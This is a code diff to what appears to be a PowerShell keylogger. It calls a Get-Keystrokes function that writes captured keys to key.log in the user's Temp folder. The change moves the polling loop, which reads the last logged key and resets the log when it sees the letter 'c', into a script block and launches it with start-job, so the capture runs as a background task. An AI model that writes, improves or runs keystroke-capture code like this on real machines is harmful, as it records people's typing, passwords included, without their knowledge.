@@ -367,7 +367,7 @@ function Get-Keystrokes {
 
 Get-Keystrokes
 
-while ($true){
+$scripp = {while ($true){
     $key = ((gc $env:USERPROFILE\AppData\Local\Temp\key.log -Tail 1) -split ",").Trim('"')
     if ($key -ceq "c"){
            "##############" > $env:USERPROFILE\AppData\Local\Temp\key.log
@@ -375,3 +375,5 @@ while ($true){
     }
 sleep -Milliseconds 200
 }
+}
+start-job -scriptblock $scripp
